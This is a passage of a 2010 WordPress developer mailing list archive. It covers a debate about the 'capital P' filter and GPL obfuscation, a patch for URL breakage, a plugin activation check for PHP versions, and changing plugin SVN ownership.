>>>> contributing. ?It's good to have great philosophical debate as long as
>>>> all sides keep it civil, refrain from snide remarks, and can agree to
>>>> disagree.
>>>>
>>>> Mitch Canter
>>>> http://www.mitchcanter.com
>>>> http://www.studionashvegas.com
>>>>
>>>> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>>>>> I'd just like to say....
>>>>>
>>>>> In spite of what everyone, including Matt, has said, I think this is the
>>>>> best discussion we've had on here for ages.
>>>>>
>>>>> Debates and points from both sides - with evidence and some big
>>>>> conclusions.
>>>>>
>>>>> Shame one side is wrong mind ... but still ?;) ?(I jest).
>>>>>
>>>>> G
>>>>>
>>>>>
>>>>> -----Original Message-----
>>>>> From: wp-hackers-bounces at lists.automattic.com
>>>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
>>>>> Westwood
>>>>> Sent: 07 July 2010 18:27
>>>>> To: wp-hackers at lists.automattic.com
>>>>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>>>>>
>>>>>
>>>>> On 7 Jul 2010, at 16:05, Mark E wrote:
>>>>>
>>>>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
>>>>> the
>>>>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>>>>>> do". And here I was thinking that you followed GPL to the letter, as
>>>>> you imply other people should do.
>>>>>
>>>>>
>>>>> In what way?
>>>>>
>>>>> I believe the specific wording from the GPL2 you are interpreting is:
>>>>>
>>>>> "The source code for a work means the preferred form of the work for
>>>>> making modifications to it. For an executable work, complete source code
>>>>> means all the source code for all modules it contains, plus any
>>>>> associated interface definition files, plus the scripts used to control
>>>>> compilation and installation of the executable. However, as a special
>>>>> exception, the source code distributed need not include anything that is
>>>>> normally distributed (in either source or binary form) with the major
>>>>> components (compiler, kernel, and so on) of the operating system on
>>>>> which the executable runs, unless that component itself accompanies the
>>>>> executable. "
>>>>>
>>>>> In my reading in no way does this preclude the distribution of
>>>>> obfuscated code - what it is trying to prevent is the distribution of
>>>>> compiled object files without the corresponding source code to allow
>>>>> modifications to be made.
>>>>>
>>>>> As JS and PHP are always distributed in source form as part of the
>>>>> WordPress download I don't see how we are violating the licence.
>>>>>
>>>>> Would you consider it a licence violation if we were to ship WordPress
>>>>> without the include .dev.js files so as to decrease the download size
>>>>> and make automatic upgrades use less memory?
>>>>>
>>>>> Cheers
>>>>> --
>>>>> Peter Westwood
>>>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>
>>>>
>>>>
>>>> --
>>>> Mitch Canter
>>>> studionashvegas
>>>> http://www.studionashvegas.com
>>>> 615-512-2838
>>>>
>>>> Find me on Twitter! http://www.studionashvegas.com
>>>>
>>>> I only check email 2-3 times a day, but if you don't hear back in
>>>> 24hr, let me know. ?Thanks!
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> Mitch Canter
>> studionashvegas
>> http://www.studionashvegas.com
>> 615-512-2838
>>
>> Find me on Twitter! http://www.studionashvegas.com
>>
>> I only check email 2-3 times a day, but if you don't hear back in
>> 24hr, let me know. ?Thanks!
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From jeffc at wptavern.com  Thu Jul  8 16:22:50 2010
From: jeffc at wptavern.com (Jeff Chandler)
Date: Thu, 08 Jul 2010 12:22:50 -0400
Subject: [wp-hackers] Putting the P in WordPress
Message-ID: <4C35FB5A.2020605@wptavern.com>

  There are already quite a few WordPress enthusiast communities with forums attached where you can talk about all things WordPress. No need to plug the one I manage but they exist.

Also, I'd like to reiterate that had the patch actually had a ticket attached to it which generally has a discussion form, I'm guessing that the discussion on the hackers mailing list would have most likely ended up within that ticket where by all rights, is where it should have been all along.  I've read that not every patch committed has a ticket for discussion but maybe that could change unless of course, discussion for tickets slows things down. I'm wondering if this particular patch forgot to be assigned to a ticket or if it was on purpose that one was not assigned to it. At any rate, that is where the venue of discussion should have occurred, not this list and since the ticket was non-existent and it was brought up on the list, well, the rest is history (still making history on this thread apparently).

From jbloch at olympianetworks.com  Thu Jul  8 16:25:32 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Thu, 8 Jul 2010 12:25:32 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C35FB5A.2020605@wptavern.com>
References: <4C35FB5A.2020605@wptavern.com>
Message-ID: <CAE88F04-253C-4E67-BCCA-61211D30458D@olympianetworks.com>

Andrew Nacin or Matt would be the ones to ask. Andrew committed it with props to Matt.

On Jul 8, 2010, at 12:22 PM, Jeff Chandler wrote:

> There are already quite a few WordPress enthusiast communities with forums attached where you can talk about all things WordPress. No need to plug the one I manage but they exist.
> 
> Also, I'd like to reiterate that had the patch actually had a ticket attached to it which generally has a discussion form, I'm guessing that the discussion on the hackers mailing list would have most likely ended up within that ticket where by all rights, is where it should have been all along.  I've read that not every patch committed has a ticket for discussion but maybe that could change unless of course, discussion for tickets slows things down. I'm wondering if this particular patch forgot to be assigned to a ticket or if it was on purpose that one was not assigned to it. At any rate, that is where the venue of discussion should have occurred, not this list and since the ticket was non-existent and it was brought up on the list, well, the rest is history (still making history on this thread apparently).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From Gavin.Pearce at 3seven9.com  Thu Jul  8 16:32:30 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Thu, 8 Jul 2010 17:32:30 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CAE88F04-253C-4E67-BCCA-61211D30458D@olympianetworks.com>
References: <4C35FB5A.2020605@wptavern.com>
	<CAE88F04-253C-4E67-BCCA-61211D30458D@olympianetworks.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FFA@tbs-sbs01.TBS.local>

You'll be lucky if you get them to give a decent "on-topic" answer to
that...

Though you are of course quite correct.

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
Sent: 08 July 2010 17:26
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

Andrew Nacin or Matt would be the ones to ask. Andrew committed it with
props to Matt.

On Jul 8, 2010, at 12:22 PM, Jeff Chandler wrote:

> There are already quite a few WordPress enthusiast communities with
forums attached where you can talk about all things WordPress. No need
to plug the one I manage but they exist.
> 
> Also, I'd like to reiterate that had the patch actually had a ticket
attached to it which generally has a discussion form, I'm guessing that
the discussion on the hackers mailing list would have most likely ended
up within that ticket where by all rights, is where it should have been
all along.  I've read that not every patch committed has a ticket for
discussion but maybe that could change unless of course, discussion for
tickets slows things down. I'm wondering if this particular patch forgot
to be assigned to a ticket or if it was on purpose that one was not
assigned to it. At any rate, that is where the venue of discussion
should have occurred, not this list and since the ticket was
non-existent and it was brought up on the list, well, the rest is
history (still making history on this thread apparently).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From eric at eamann.com  Thu Jul  8 16:40:51 2010
From: eric at eamann.com (Eric Mann)
Date: Thu, 8 Jul 2010 09:40:51 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FFA@tbs-sbs01.TBS.local>
References: <4C35FB5A.2020605@wptavern.com>
	<CAE88F04-253C-4E67-BCCA-61211D30458D@olympianetworks.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FFA@tbs-sbs01.TBS.local>
Message-ID: <2120154089.166405.1278607251743.JavaMail.open-xchange@oxusltgw12.schlund.de>

Andrew was fairly engaging over Twitter the other day ... I think it would be
safe to bet that he's got a decent "on-topic" answer for you.
?

On July 8, 2010 at 4:32 PM Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

> You'll be lucky if you get them to give a decent "on-topic" answer to
> that...
>
> Though you are of course quite correct.
>
> G
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
> Sent: 08 July 2010 17:26
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> Andrew Nacin or Matt would be the ones to ask. Andrew committed it with
> props to Matt.
>
> On Jul 8, 2010, at 12:22 PM, Jeff Chandler wrote:
>
> > There are already quite a few WordPress enthusiast communities with
> forums attached where you can talk about all things WordPress. No need
> to plug the one I manage but they exist.
> >
> > Also, I'd like to reiterate that had the patch actually had a ticket
> attached to it which generally has a discussion form, I'm guessing that
> the discussion on the hackers mailing list would have most likely ended
> up within that ticket where by all rights, is where it should have been
> all along.? I've read that not every patch committed has a ticket for
> discussion but maybe that could change unless of course, discussion for
> tickets slows things down. I'm wondering if this particular patch forgot
> to be assigned to a ticket or if it was on purpose that one was not
> assigned to it. At any rate, that is where the venue of discussion
> should have occurred, not this list and since the ticket was
> non-existent and it was brought up on the list, well, the rest is
> history (still making history on this thread apparently).
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From Gavin.Pearce at 3seven9.com  Thu Jul  8 16:52:22 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Thu, 8 Jul 2010 17:52:22 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <2120154089.166405.1278607251743.JavaMail.open-xchange@oxusltgw12.schlund.de>
References: <4C35FB5A.2020605@wptavern.com><CAE88F04-253C-4E67-BCCA-61211D30458D@olympianetworks.com><CD47955B7E065D48AB5CF226C2ED75C02E2FFA@tbs-sbs01.TBS.local>
	<2120154089.166405.1278607251743.JavaMail.open-xchange@oxusltgw12.schlund.de>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FFB@tbs-sbs01.TBS.local>

Previous experience tends towards my direct questions getting misplaced within long, attacking answers, so please do excuse my coy-ness.

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
Sent: 08 July 2010 17:41
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

Andrew was fairly engaging over Twitter the other day ... I think it would be
safe to bet that he's got a decent "on-topic" answer for you.
?

On July 8, 2010 at 4:32 PM Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

> You'll be lucky if you get them to give a decent "on-topic" answer to
> that...
>
> Though you are of course quite correct.
>
> G
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
> Sent: 08 July 2010 17:26
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> Andrew Nacin or Matt would be the ones to ask. Andrew committed it with
> props to Matt.
>
> On Jul 8, 2010, at 12:22 PM, Jeff Chandler wrote:
>
> > There are already quite a few WordPress enthusiast communities with
> forums attached where you can talk about all things WordPress. No need
> to plug the one I manage but they exist.
> >
> > Also, I'd like to reiterate that had the patch actually had a ticket
> attached to it which generally has a discussion form, I'm guessing that
> the discussion on the hackers mailing list would have most likely ended
> up within that ticket where by all rights, is where it should have been
> all along.? I've read that not every patch committed has a ticket for
> discussion but maybe that could change unless of course, discussion for
> tickets slows things down. I'm wondering if this particular patch forgot
> to be assigned to a ticket or if it was on purpose that one was not
> assigned to it. At any rate, that is where the venue of discussion
> should have occurred, not this list and since the ticket was
> non-existent and it was brought up on the list, well, the rest is
> history (still making history on this thread apparently).
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From dougal at gunters.org  Thu Jul  8 19:09:13 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Thu, 08 Jul 2010 15:09:13 -0400
Subject: [wp-hackers] Putting the H in WordPress-Hackers
In-Reply-To: <4C349DC1.4010205@gunters.org>
References: <4C349DC1.4010205@gunters.org>
Message-ID: <4C362259.3030300@gunters.org>

On Jul 7 2010 11:31 AM, Dougal Campbell wrote:
> Can we be done with the 'P' discussion now? Please?

I didn't realize when I wrote my original message that this function was 
implemented in a way that can break URLs. I therefore reverse my 
position. When it can cause unintended breakage, it's a problem. An 
edge-case problem, perhaps, but definitely not something to be ignored, IMO.

Since there is no indication that the filter will be completely removed, 
I've thrown in a patch on the Trac ticket which could at least help with 
the URL breakage problem. It also introduces a generic mechanism by 
which other filters can be limited to only affecting regular text, and 
not HTML tags.

   http://core.trac.wordpress.org/ticket/13971#comment:64

I'll admit that it's not as elegant as I'd like, especially the whole 
preg_replace_callback->create_function->call_user_func chain. Plus 
you'll end up adding an extra shim function for each filter you want to 
use with it. So it adds, um, four extra layers of function calls. And 
preg_replace_callback is breaking your content into chunks of 
non-html-tag text and passing each block through the chain.

So yeah, ick. BUT IT WORKS! ;) (disclaimer: as far as I can tell)

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From list at expost.org  Fri Jul  9 05:41:38 2010
From: list at expost.org (Raj)
Date: Fri, 9 Jul 2010 11:11:38 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below PHP 5?
Message-ID: <000601cb1f29$6ccfd0b0$466f7210$@org>

Hi all,

 

I am getting a lot of emails from users of my plugin who are running it on
PHP 4.x and are seeing errors. How do I prevent the plugin from being
activated if the version of PHP is below PHP 5-? What should a plugin do to
not get activated? Meaning.. to signal to Wordpress that the activation
should be cancelled. 

 

Raj


From me at piyushmishra.com  Fri Jul  9 06:57:40 2010
From: me at piyushmishra.com (Piyush Mishra)
Date: Fri, 9 Jul 2010 12:27:40 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below PHP
	5?
In-Reply-To: <000601cb1f29$6ccfd0b0$466f7210$@org>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
Message-ID: <AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>

make an activation hook to check version and keep an option or
something for activation. set that to 0 with the hook if php version
is less thn 5 for more thn 5 set it to 1 and use that as a check...

On 7/9/10, Raj <list at expost.org> wrote:
> Hi all,
>
>
>
> I am getting a lot of emails from users of my plugin who are running it on
> PHP 4.x and are seeing errors. How do I prevent the plugin from being
> activated if the version of PHP is below PHP 5-? What should a plugin do to
> not get activated? Meaning.. to signal to Wordpress that the activation
> should be cancelled.
>
>
>
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Regards
Piyush Mishra
http://www.piyushmishra.com/
Life's Short, Live it to the maximum

From otto at ottodestruct.com  Fri Jul  9 07:03:20 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 02:03:20 -0500
Subject: [wp-hackers] How do I prevent activation of plugin is below PHP
	5?
In-Reply-To: <000601cb1f29$6ccfd0b0$466f7210$@org>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
Message-ID: <AANLkTik3vfKtfHH8HMJwtYgLeWxiWT5GLP99NKfGq3hR@mail.gmail.com>

/**
 * plugin_activation_check()
 *
 * Replace "plugin" with the name of your plugin
 */
function plugin_activation_check(){
	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or higher.");
	}
}
register_activation_hook(__FILE__, 'plugin_activation_check');


-Otto



On Fri, Jul 9, 2010 at 12:41 AM, Raj <list at expost.org> wrote:
> Hi all,
>
>
>
> I am getting a lot of emails from users of my plugin who are running it on
> PHP 4.x and are seeing errors. How do I prevent the plugin from being
> activated if the version of PHP is below PHP 5-? What should a plugin do to
> not get activated? Meaning.. to signal to Wordpress that the activation
> should be cancelled.
>
>
>
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Fri Jul  9 07:05:46 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 9 Jul 2010 09:05:46 +0200
Subject: [wp-hackers] change owner of Plugin SVN folder
Message-ID: <AANLkTinAR0Wzx6CLDAuz03HGrqhTkskHukytyMvfu97a@mail.gmail.com>

Hello,
i will change the owner of a plugin in the SVN on wp.org; how is this
possible?
I will not give my user and password, i have also many other plugins.
Thanks for feedback!

From list at expost.org  Fri Jul  9 07:12:21 2010
From: list at expost.org (Raj)
Date: Fri, 9 Jul 2010 12:42:21 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below
	PHP5?
In-Reply-To: <AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
	<AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>
Message-ID: <000a01cb1f36$146799a0$3d36cce0$@org>

Thanks for the response Piyush. Is there any value the activation hook
should return so that Wordpress doesn't mark the plugin activated in the
plugins list. Sure I can check if the version is below 5 using a eregi() and
phpversion() but how do I communicate to wordpress that the plugin should
not be marked as activated? If possible, anyway to make sure that the plugin
is not even available for activation?

Raj

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Piyush Mishra
Sent: Friday, July 09, 2010 12:28 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] How do I prevent activation of plugin is below PHP
5?

make an activation hook to check version and keep an option or
something for activation. set that to 0 with the hook if php version
is less thn 5 for more thn 5 set it to 1 and use that as a check...

On 7/9/10, Raj <list at expost.org> wrote:
> Hi all,
>
>
>
> I am getting a lot of emails from users of my plugin who are running it on
> PHP 4.x and are seeing errors. How do I prevent the plugin from being
> activated if the version of PHP is below PHP 5-? What should a plugin do
to
> not get activated? Meaning.. to signal to Wordpress that the activation
> should be cancelled.
>
>
>
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Regards
Piyush Mishra
http://www.piyushmishra.com/
Life's Short, Live it to the maximum
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From me at piyushmishra.com  Fri Jul  9 07:41:36 2010
From: me at piyushmishra.com (Piyush Mishra)
Date: Fri, 9 Jul 2010 13:11:36 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below
	PHP5?
In-Reply-To: <000a01cb1f36$146799a0$3d36cce0$@org>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
	<AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>
	<000a01cb1f36$146799a0$3d36cce0$@org>
Message-ID: <AANLkTinSND0tE2itCOpt5K7hyT1v-ZKdtHTk8f3NTQqe@mail.gmail.com>

see otto's reply :)
the other(not recomended) way is to remove ur plugin from active
plugins list in options table

On 7/9/10, Raj <list at expost.org> wrote:
> Thanks for the response Piyush. Is there any value the activation hook
> should return so that Wordpress doesn't mark the plugin activated in the
> plugins list. Sure I can check if the version is below 5 using a eregi() and
> phpversion() but how do I communicate to wordpress that the plugin should
> not be marked as activated? If possible, anyway to make sure that the plugin
> is not even available for activation?
>
> Raj
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Piyush Mishra
> Sent: Friday, July 09, 2010 12:28 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] How do I prevent activation of plugin is below PHP
> 5?
>
> make an activation hook to check version and keep an option or
> something for activation. set that to 0 with the hook if php version
> is less thn 5 for more thn 5 set it to 1 and use that as a check...
>
> On 7/9/10, Raj <list at expost.org> wrote:
>> Hi all,
>>
>>
>>
>> I am getting a lot of emails from users of my plugin who are running it on
>> PHP 4.x and are seeing errors. How do I prevent the plugin from being
>> activated if the version of PHP is below PHP 5-? What should a plugin do
> to
>> not get activated? Meaning.. to signal to Wordpress that the activation
>> should be cancelled.
>>
>>
>>
>> Raj
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
> --
> Regards
> Piyush Mishra
> http://www.piyushmishra.com/
> Life's Short, Live it to the maximum
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Regards
Piyush Mishra
http://www.piyushmishra.com/
Life's Short, Live it to the maximum

From otto at ottodestruct.com  Fri Jul  9 07:42:54 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Jul 2010 02:42:54 -0500
Subject: [wp-hackers] change owner of Plugin SVN folder
In-Reply-To: <AANLkTinAR0Wzx6CLDAuz03HGrqhTkskHukytyMvfu97a@mail.gmail.com>
References: <AANLkTinAR0Wzx6CLDAuz03HGrqhTkskHukytyMvfu97a@mail.gmail.com>
Message-ID: <AANLkTinADwDJdchNdj1jmlTZ4n5fx5IsJWa7dfd3OJ-M@mail.gmail.com>

Go to your plugin's page on Extend. Click the "Admin" link.

There you can add the new owner as a committer. This gives him access
to the plugin and SVN and such, so he can modify the code.

You'll need to know his wordpress.org username to add him.

-Otto



On Fri, Jul 9, 2010 at 2:05 AM, Frank Bueltge <frank at bueltge.de> wrote:
> Hello,
> i will change the owner of a plugin in the SVN on wp.org; how is this
> possible?
> I will not give my user and password, i have also many other plugins.
> Thanks for feedback!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From navjotjsingh at gmail.com  Fri Jul  9 07:48:38 2010
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Fri, 9 Jul 2010 13:18:38 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below
	PHP5?
In-Reply-To: <000a01cb1f36$146799a0$3d36cce0$@org>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
	<AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com> 
	<000a01cb1f36$146799a0$3d36cce0$@org>
Message-ID: <AANLkTinKD9OqJ-OQMppcU6lltV0xSl9M8RRQvUCYCawY@mail.gmail.com>

Making it not available for activation is not a wise idea. Otherwise people
will be left confused why its not appearing in active plugins and will
complain to you. Showing a nice error message as suggested by Otto should
work. Plus people will automatically know they need to get PHP5 to run your
plugin.

Navjot

On Fri, Jul 9, 2010 at 12:42 PM, Raj <list at expost.org> wrote:

> Thanks for the response Piyush. Is there any value the activation hook
> should return so that Wordpress doesn't mark the plugin activated in the
> plugins list. Sure I can check if the version is below 5 using a eregi()
> and
> phpversion() but how do I communicate to wordpress that the plugin should
> not be marked as activated? If possible, anyway to make sure that the
> plugin
> is not even available for activation?
>
> Raj
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Piyush
> Mishra
> Sent: Friday, July 09, 2010 12:28 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] How do I prevent activation of plugin is below
> PHP
> 5?
>
> make an activation hook to check version and keep an option or
> something for activation. set that to 0 with the hook if php version
> is less thn 5 for more thn 5 set it to 1 and use that as a check...
>
> On 7/9/10, Raj <list at expost.org> wrote:
> > Hi all,
> >
> >
> >
> > I am getting a lot of emails from users of my plugin who are running it
> on
> > PHP 4.x and are seeing errors. How do I prevent the plugin from being
> > activated if the version of PHP is below PHP 5-? What should a plugin do
> to
> > not get activated? Meaning.. to signal to Wordpress that the activation
> > should be cancelled.
> >
> >
> >
> > Raj
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> --
> Regards
> Piyush Mishra
> http://www.piyushmishra.com/
> Life's Short, Live it to the maximum
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From list at expost.org  Fri Jul  9 09:13:57 2010
From: list at expost.org (Raj)
Date: Fri, 9 Jul 2010 14:43:57 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is
	below	PHP5?
In-Reply-To: <AANLkTinSND0tE2itCOpt5K7hyT1v-ZKdtHTk8f3NTQqe@mail.gmail.com>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>	<AANLkTimYT-MiXsihi4GKDaJ2lELFGDi7ZG5zZyH6pHNo@mail.gmail.com>	<000a01cb1f36$146799a0$3d36cce0$@org>
	<AANLkTinSND0tE2itCOpt5K7hyT1v-ZKdtHTk8f3NTQqe@mail.gmail.com>
Message-ID: <000301cb1f47$2f2e3e90$8d8abbb0$@org>

Otto replied? I didn't get it. Will check in the hackers archive. 

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Piyush Mishra
Sent: Friday, July 09, 2010 1:12 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] How do I prevent activation of plugin is below
PHP5?

see otto's reply :)
the other(not recomended) way is to remove ur plugin from active
plugins list in options table



From frank at bueltge.de  Fri Jul  9 09:48:18 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 9 Jul 2010 11:48:18 +0200
Subject: [wp-hackers] change owner of Plugin SVN folder
In-Reply-To: <AANLkTinADwDJdchNdj1jmlTZ4n5fx5IsJWa7dfd3OJ-M@mail.gmail.com>
References: <AANLkTinAR0Wzx6CLDAuz03HGrqhTkskHukytyMvfu97a@mail.gmail.com> 
	<AANLkTinADwDJdchNdj1jmlTZ4n5fx5IsJWa7dfd3OJ-M@mail.gmail.com>
Message-ID: <AANLkTiltLB6ji56mNTVKbgfuyxFkC58zGGi1HOI6LPhH@mail.gmail.com>

Hello Otto,

many thanks, great and fast answer.
Best wishe
Frank



On Fri, Jul 9, 2010 at 9:42 AM, Otto <otto at ottodestruct.com> wrote:

> Go to your plugin's page on Extend. Click the "Admin" link.
>
> There you can add the new owner as a committer. This gives him access
> to the plugin and SVN and such, so he can modify the code.
>
> You'll need to know his wordpress.org username to add him.
>
> -Otto
>
>
>
> On Fri, Jul 9, 2010 at 2:05 AM, Frank Bueltge <frank at bueltge.de> wrote:
> > Hello,
> > i will change the owner of a plugin in the SVN on wp.org; how is this
> > possible?
> > I will not give my user and password, i have also many other plugins.
> > Thanks for feedback!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From me at piyushmishra.com  Fri Jul  9 11:04:47 2010
From: me at piyushmishra.com (Piyush Mishra)
Date: Fri, 9 Jul 2010 16:34:47 +0530
Subject: [wp-hackers] How do I prevent activation of plugin is below
	PHP5?
In-Reply-To: <000301cb1f47$2f2e3e90$8d8abbb0$@org>
References: <000601cb1f29$6ccfd0b0$466f7210$@org>
